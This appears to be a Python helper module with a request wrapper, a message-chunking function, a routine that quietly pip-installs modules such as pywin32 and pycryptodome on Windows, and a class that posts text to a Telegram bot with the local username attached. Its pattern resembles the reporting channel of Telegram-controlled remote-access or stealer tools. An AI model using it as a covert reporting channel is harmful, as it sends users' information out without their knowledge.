import requests
import subprocess
import getpass
import os, sys
def Request(url):
	url = url.replace("#","")
	return requests.get(url).text

def Split_Array(arr, size):
	arrs = []
	while len(arr) > size:
		pice = arr[:size]
		arrs.append(pice)
		arr = arr[size:]
	arrs.append(arr)
	return arrs

def Install_Module(module):
	json = {
		'win32com' : 'pywin32',
		'win32gui' : 'pywin32',
		'Crypto' : 'pycryptodome'
	}
		
	if module in json.keys():
		install = json[module]
	else:
		install = module

	sub = subprocess.Popen([os.path.dirname(os.path.abspath(sys.argv[0])) + "\\" + "python.exe","-m","pip","install",install],shell=True,stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE)
	output, error = sub.communicate()
	try:
		subprocess.check_call([os.path.dirname(os.path.abspath(sys.argv[0])) + "\\" + "python.exe" , "-c" , 'import '+ module])
		return True
	except Exception as ex:
		return error


class Send_Message():
	def __init__(self):
		self.token = None
		self.chat_id = None

	def Send(self, message):
		for i in Split_Array(message,4000):
			Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + i + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
